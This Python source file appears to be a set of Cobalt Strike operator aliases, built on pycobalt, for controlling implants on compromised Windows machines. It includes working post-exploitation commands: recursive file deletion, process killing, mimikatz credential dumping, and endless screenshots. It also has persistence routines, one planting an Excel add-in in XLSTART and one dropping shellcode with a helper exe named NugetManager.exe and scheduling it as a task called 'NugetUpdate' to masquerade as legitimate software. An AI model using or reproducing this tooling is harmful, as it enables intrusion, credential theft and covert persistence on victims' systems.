#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import os
import re
import textwrap
import datetime
import collections
import copy
import sleep

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
import pycobalt.sharpgen as sharpgen
import pycobalt.console as console
from pycobalt.helpers import powershell_quote

import processes

aliases.set_quote_replacement('^')

@aliases.alias('eval', 'Eval aggressor code for a beacon, with $bid set')
def _(bid, code):
    code = '$bid = {}; {};'.format(bid, code)
    engine.eval(code)

#@aliases.alias('ziplist', 'List files in a zip file')
#def _(bid, zipfile):
#    command = """
#Add-Type -assembly "system.io.compression.filesystem"
#[io.compression.zipfile]::OpenRead({}).Entries.Name
#""".format(powershell_quote(zipfile))
#    aggressor.bpowerpick(bid, command)

@aliases.alias('powerpick', 'Replace the regular powerpick')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bpowerpick(bid, command)

@aliases.alias('pp', 'Alias for powerpick')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bpowerpick(bid, command)

@aliases.alias('psh', 'Alias for powershell')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bpowershell(bid, command)

@aliases.alias('s', 'Alias for shell')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bshell(bid, command)

@aliases.alias('lr', 'Recursively list files and directories')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = ''
    for d in dirs:
        command += 'Get-ChildItem -Recurse {}\n'.format(powershell_quote(d))

    aggressor.btask(bid, 'Tasked beacon to recursively list files in: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('rmr', 'Recursively delete files and directories')
def _(bid, *dirs):
    if not dirs:
        aggressor.berror(bid, 'rmr: specify some directories to kill')
        return

    command = ''
    for d in dirs:
        command += 'Remove-Item -Recurse -Force {}\n'.format(powershell_quote(d))

    aggressor.btask(bid, 'Tasked beacon to recursively delete: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('cat', 'View files')
def _(bid, *files):
    if not files:
        aggressor.berror(bid, 'cat: specify some files to cat')
        return

    code = helpers.code_string(r"""
    foreach (string file in args) {
        var text = System.IO.File.ReadAllText(file);
        System.Console.Write(text);
    }
    """)

    aggressor.btask(bid, 'Tasked beacon to get contents of: {}'.format(', '.join(files)))
    sharpgen.execute(bid, code, files)

@aliases.alias('head', 'View head of file')
def _(bid, fname, lines=10):
    code = helpers.code_string(r"""
    string file = args[0];
    int lines = Int32.Parse(args[1]);
    string text = string.Join("\r\n", System.IO.File.ReadLines(file).Take(lines));
    System.Console.WriteLine(text);
    """)

    aggressor.btask('Tasked beacon to get first {} lines of {}'.format(lines, fname))
    sharpgen.execute(bid, code, (fname, lines))

@aliases.alias('tail', 'View tail of file')
def _(bid, fname, lines=10):
    aggressor.btask('Tasked beacon to get tail of {}'.format(fname))
    aggressor.bpowerpick(bid, 'gc {} | select -last {} '.format(powershell_quote(fname), lines), silent=True)

@aliases.alias('dus', 'Show file and directory sizes')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = ''
    for d in dirs:
        command += """
        gci {} |
        """.format(powershell_quote(d))

        command += helpers.code_string(r"""
                       %{$f=$_; gci -r $_.FullName |
                         measure-object -property length -sum |
                         select  @{Name="Name"; Expression={$f}},
                                 @{Name="Sum (MB)";
                                 Expression={"{0:N3}" -f ($_.sum / 1MB) }}, Sum } |
                       sort Sum -desc |
                       format-table -Property Name,"Sum (MB)", Sum -autosize;
                       """)

    aggressor.btask(bid, 'Tasked beacon to get file sizes in: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('df', 'Show filesystem info')
def _(bid):
    aggressor.bpowerpick(bid, 'Get-PSDrive -PSProvider FileSystem')

@aliases.alias('drive-list', 'Run ls in each drive')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to list files at root of each drive')
    aggressor.bpowerpick(bid, 'Get-PSDrive -PSProvider Filesystem | ForEach-Object { ls $_.root; }')

@aliases.alias('profiles', 'Show user profiles')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to show user profiles')
    aggressor.bls(bid, r'C:\Users')

@aliases.alias('profiles-list', 'Run ls in each user profile')
def _(bid, *users):
    if users:
        aggressor.btask(bid, 'Tasked beacon to list files in user profiles for: {}'.format(', '.join(users)))
        for user in users:
            aggressor.bls(bid, r'C:\Users\{}'.format(user), silent=True)
    else:
        aggressor.btask(bid, 'Tasked beacon to list files in each user profile')
        aggressor.bpowerpick(bid, r'ls C:\Users | ForEach-Object { ls $_; }', silent=True)

@aliases.alias('readlink', 'Show .lnk location and arguments')
def _(bid, *lnks):
    command = '$sh = New-Object -ComObject WScript.Shell'

    for lnk in lnks:
        command += helpers.code_string(r"""
            $shortcut = $sh.CreateShortcut({})
            #$target = $shortcut.TargetPath
            #$arguments = $target.Arguments
            #echo "$target $arguments"
            echo "$shortcut.TargetPath $target.Arguments"
            """.format(powershell_quote(lnk)))

    aggressor.btask(bid, 'Tasked beacon to read links: {}'.format(', '.join(lnks)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('pb', 'Open process browser')
def _(bid):
    aggressor.openProcessBrowser(bid)

@aliases.alias('page', 'Make new page in beacon console')
def _(bid):
    aggressor.blog2(bid, '-' * 40 + '\n' * 60)

@aliases.alias('info', 'Show beacon info')
def _(bid):
    out = "Beacon info:\n\n"
    for key, value in aggressor.beacon_info(bid).items():
        out += ' - {}: {}\n'.format(key, value)

    aggressor.blog2(bid, out)

@aliases.alias('loaded', 'Show loaded powershell modules')
def _(bid):
    loaded = aggressor.data_query('cmdlets')
    if bid in loaded:
        out = 'Loaded modules:\n'
        for module in loaded[bid]:
            if module.lower() in ['local', 'that', 'struct', 'field', 'before',
                                  'psenum', 'func', '']:
                # not sure what these are
                continue

            out += ' - {}\n'.format(module)

        aggressor.blog2(bid, out)
    else:
        aggressor.berror(bid, 'No loaded modules')

jobkillall_items = collections.defaultdict(list)

@events.event('beacon_output_jobs')
def jobkillall_callback(bid, text, when):
    global jobkillall_items

    jobs = helpers.parse_jobs(text)

    if bid not in jobkillall_items:
        # doesn't concern us
        return

    for job in jobs:
        for item in jobkillall_items[bid]:
            if not item or item.lower() in job['description'].lower():
                # kill it
                aggressor.blog2(bid, 'Killing job: {} (JID {}) (PID {})'.format(job['description'], job['jid'], job['pid']))
                aggressor.bjobkill(bid, job['jid'])
                break

    del jobkillall_items[bid]

@aliases.alias('jobkillall', 'Kill all jobs matching a description (or all jobs)')
def _(bid, description=None):
    global jobkillall_items

    if bid not in jobkillall_items:
        # trigger jobs command
        aggressor.bjobs(bid, silent=True)

    jobkillall_items[bid].append(description)

# TODO just make this a powershell one-liner
@aliases.alias('killall')
def _(bid, proc_name):
    def callback(procs):
        if procs:
            for proc in procs:
                out = 'Killing {}: {}'.format(proc_name, proc['pid'])
                if 'arch' in proc:
                    out += ' ({})'.format(proc['arch'])
                if 'user' in proc:
                    out += ' ({})'.format(proc['user'])

                aggressor.btask(bid, out)
                aggressor.bkill(bid, proc['pid'], silent=True)
        else:
            aggressor.berror(bid, 'No processes named {}'.format(proc_name))

    aggressor.btask(bid, 'Tasked beacon to kill processes named {}'.format(proc_name))
    helpers.find_process(bid, proc_name, callback)

# TODO just make this a powershell one-liner
@aliases.alias('pgrep')
def _(bid, proc_name):
    def callback(procs):
        if procs:
            for proc in procs:
                out = 'Found {}: {}'.format(proc_name, proc['pid'])
                if 'arch' in proc:
                    out += ' ({})'.format(proc['arch'])
                if 'user' in proc:
                    out += ' ({})'.format(proc['user'])
                aggressor.blog2(bid, out)
        else:
            aggressor.berror(bid, 'No processes named {}'.format(proc_name))

    aggressor.btask(bid, 'Tasked beacon to search for processes named {}'.format(proc_name))
    helpers.find_process(bid, proc_name, callback)

@aliases.alias('describe', 'Get description for executables')
def _(bid, *exes):
    command = ''

    if not exes:
        raise RuntimeError('describe: Specify at least one exe to describe')

    for exe in exes:
        command += '"{0}, {1}" -f $_.Name, [System.Diagnostics.FileVersionInfo]::GetVersionInfo(' + powershell_quote(exe) + ').FileDescription }\n'

    aggressor.btask(bid, 'Tasked beacon to show version info for: {}'.format(', '.join(exes)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('procs', 'Get description for processes by pid')
def _(bid, *pids):
    command = ''

    if pids:
        command += 'Get-Process -Id {}; '.format(','.join(pids))
    else:
        command += 'Get-Process | '

    command += helpers.code_string("""
        ForEach-Object {
            "{0}, {1}" -f $_.Name, [System.Diagnostics.FileVersionInfo]::GetVersionInfo($_.Path).FileDescription }
        }
        """)

    aggressor.btask(bid, 'Tasked beacon to show version info for processes {}'.format(', '.join(pids)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('cl', 'Alias for cd; ls; pwd')
def _(bid, *args):
    directory = ' '.join(args)
    aggressor.bcd(bid, directory)
    aggressor.bls(bid)
    aggressor.bpwd(bid, silent=True)

@aliases.alias('l', 'Run ls on multiple directories')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    for d in dirs:
        aggressor.bls(bid, d)

@aliases.alias('la', 'Run ls within all subdirectories of a directory')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = 'ls '
    command += ', '.join([powershell_quote('{}\*\*'.format(d)) for d in dirs])

    aggressor.btask(bid, 'Tasked beacon to list */* in: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

# TODO fix
@aliases.alias('ll', 'Run ls and show links')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = ''

    for d in dirs:
        command += 'Get-ChildItem {} | % {{ fsutil reparsepoint query $_ }}\n'.format(powershell_quote(d))

    aggressor.btask(bid, 'Tasked beacon to list links in: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('lt', 'List files, sorted by time')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    #command += "Where-Object { -not \$_.PsIsContainer } |
    command = ''
    for d in dirs:
        command += helpers.code_string(r"""
            Get-ChildItem -Path {} |
            Sort-Object LastWriteTime -Ascending;
            """.format(powershell_quote(d)))

    aggressor.btask(bid, 'Tasked beacon to do a sorted-by-time list of: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('log', 'Display message on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.blog(bid, msg)

@aliases.alias('log2', 'Display message on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.blog2(bid, msg)

@aliases.alias('error', 'Display error on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.berror(bid, msg)

@aliases.alias('ping', 'Ping a beacon')
def _(bid):
    aggressor.bshell(bid, 'echo pong')

@aliases.alias('estomp')
def _(bid, fname):
    helpers.explorer_stomp(bid, fname)

@aliases.alias('uploadto', 'Upload file to a specified location')
def _(bid, local_file, remote_file):
    helpers.upload_to(bid, local_file, remote_file)

@aliases.alias('find', 'Find a file', 'See `find -h`')
def _(bid, *args):
    parser = helpers.ArgumentParser(bid=bid, prog='find')
    parser.add_argument('-n', '--name', action='append', help='Name to match')
    parser.add_argument('-i', '--iname', action='append', help='Name to match (case insensitive)')
    parser.add_argument('--not', dest='not_', action='store_true', help='Invert --name and --iname')
    parser.add_argument('-d', '--days', type=int, help='Select files no more than DAYS old')
    parser.add_argument('--dirs', action='store_true', help='Include directories')
    parser.add_argument('-o', '--out', help='Output file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose')
    parser.add_argument('--home', action='store_true', help='Search relative to %USERPROFILE% instead of .')
    parser.add_argument('dir', default='.', help='Directory to search from (default: .)')
    try: args = parser.parse_args(args)
    except: return

    # --home
    if args.home:
        directory = r'$env:userprofile\{}'.format(powershell_quote(args.dir))
    else:
        directory = powershell_quote(args.dir)

    command = 'gci -Recurse -Path {} 2>$null'.format(directory)

    # --dirs
    if not args.dirs:
        command += ' | where { ! $_.PSIsContainer }'

    name_matches = []

    # -n/--name
    if args.name:
        for name in args.name:
            name_matches.append('$_.Name -Clike {}'.format(powershell_quote(name)))

    # -i/--iname
    if args.iname:
        for iname in args.iname:
            name_matches.append('$_.Name -Like {}'.format(powershell_quote(iname)))

    if name_matches:
        where_statement = ' -Or '.join(name_matches)

        # --not
        if args.not_:
            where_statement = '-Not ({})'.format(where_statement)

        command += " | Where-Object { " + where_statement + " }"

    # -d/--days
    if args.days:
        command += ' | ? { $_.LastWriteTime -Ge (Get-Date).AddDays(-{}) }'

    # -o/--out
    if args.out:
        command += ' > {}'.format(powershell_quote(args.out))

    command += "; echo 'Finished searching in {}'".format(directory)

    aggressor.btask(bid, 'Tasked beacon to search for files in {}'.format(directory))
    # -v/--verbose
    aggressor.bpowerpick(bid, command, silent=not args.verbose)

@aliases.alias('curl', 'Get contents of webpage')
def _(bid, url):
    aggressor.bpowerpick(bid,
            '(New-Object System.Net.WebClient).DownloadString({})'.format(powershell_quote(url)))

@aliases.alias('headers', 'Get response headers for webpage (sends GET request)')
def _(bid, url):
    if ':' not in url:
        # add scheme
        url = 'http://' + url

    command = helpers.code_string(r"""
        $request = [System.Net.WebRequest]::Create({})
        """.format(powershell_quote(url)))
    command += helpers.code_string(r"""
        $response = $request.GetResponse()
        $headers = $response.Headers
        $headers.AllKeys |
             Select-Object @{ Name = "Key"; Expression = { $_ }},
             @{ Name = "Value"; Expression = { $headers.GetValues( $_ ) } }
         """)

    aggressor.btask(bid, 'Tasked beacon to get headers for URL: {}'.format(url))
    aggressor.bpowerpick(bid, command, silent=True)

# TODO make this pure powershell
@aliases.alias('host', 'Resolve hostname')
def _(bid, *hosts):
    command = ''

    if not hosts:
        aggressor.berror('specify a host')
        return

    for host in hosts:
        command += 'nslookup {}\n'.format(powershell_quote(host))

    aggressor.btask(bid, 'Tasked beacon to resolve host(s): {}'.format(', '.join(hosts)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('home', 'Change to probable home directory')
def _(bid):
    home = helpers.guess_home(bid)
    aggressor.bcd(bid, home)
    aggressor.bls(bid)
    aggressor.bpwd(bid, silent=True)

unknown_processes = utils.basedir('resources/unknown_processes.txt')

@aliases.alias('windows', 'Show windows')
def _(bid):
    command = helpers.code_string(r"""
    Get-Process |
        Where { $_.mainWindowTitle } |
        Format-Table id,name,mainwindowtitle -AutoSize
    """)

    aggressor.btask(bid, 'Tasked beacon to list open windows')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('powershell-version', 'Get powershell version')
def _(bid):
    aggressor.bpowershell(bid, 'echo $PSVersionTable.PSVersion')

@aliases.alias('screenshot-spawn', 'Spawn and run screenshot tool (forever by default)')
def _(bid, time=999999):
    aggressor.bscreenshot(bid, time)

@aliases.alias('excel-persist', 'Persist with a .xlam file in XLSTART')
def _(bid, xlam):
    appdata = helpers.guess_appdata(bid)
    user_xlstart = r'{}\Microsoft\Excel\XLSTART'.format(appdata)

    aggressor.bmkdir(bid, user_xlstart)
    helpers.upload_to(bid, xlam, r'{}\module.xlam'.format(user_xlstart))

@aliases.alias('word-persist', 'Persist with a .dotm file in Templates')
def _(bid, xlam):
    appdata = helpers.guess_appdata(bid)
    templates = r'{}\Microsoft\Templates'.format(appdata)

    aggressor.bmkdir(bid, user_xlstart)
    helpers.upload_to(bid, xlam, r'{}\module.xlam'.format(user_xlstart))

@aliases.alias('shellcode-persist', 'Persist with shellcode and a helper exe')
def _(bid, shellcode):
    local_helper = utils.basedir('tools/native_persist.exe')

    appdata = helpers.guess_appdata(bid)
    nuget_dir = r'{}\NuGet'.format(appdata)
    remote_helper = r'{}\NugetManager.exe'.format(nuget_dir)
    aggressor.bmkdir(bid, nuget_dir)

    helpers.upload_to(bid, shellcode, r'{}\nuget.package'.format(nuget_dir))
    helpers.upload_to(bid, local_helper, remote_helper)

    aggressor.bshell(bid, 'schtasks /create /f /tn NugetUpdate /sc daily /tr {}'.format(remote_helper))

@aliases.alias('mimi', 'Run multiple mimikatz commands')
def _(bid, *commands):
    line = '\n'.join(commands)
    aggressor.bmimikatz(bid, line)

@aliases.alias('sl', 'Better sleep command')
def _(bid, value, jitter='30'):
    sleep.sleep(bid, value, int(jitter))

@aliases.alias('pause', 'Pause beacon for period of time')
def _(bid, value):
    sleep.pause(bid, value)

# Run a local shell command
@commands.command('shell')
def _(*command):
    command = ' '.join(command)
    _, output, _ = helpers.capture(command)
    aggressor.println(output)

@aliases.alias('client', 'Run a shell command on the local (client) host')
def _(bid, *command):
    command = ' '.join(command)
    _, output, _ = helpers.capture(command)
    aggressor.blog2(bid, 'Local shell output:\n' + output.decode())

@aliases.alias('testargs', 'Test args')
def _(bid, *args):
    # public static string PowerShellExecute(string PowerShellCode, bool OutString = true, bool BypassLogging = true, bool BypassAmsi = true)
    code = helpers.code_string("""
    foreach (string arg in args) {
        Console.WriteLine("> " + arg);
    }
    """)

    sharpgen.execute(bid, code, args,
            add_references=['System.Management.Automation.dll', 'SharpSploit.dll'], cache=True, delete_after=False, silent=False)

@aliases.alias('env', 'Get environmental variables')
def _(bid):
    command = helpers.code_string(r"""
        Get-Childitem -path env:* |
            Select-Object Name, Value |
            Sort-Object name |
            Format-Table -Auto
        """)

    aggressor.bpowerpick(bid, command)
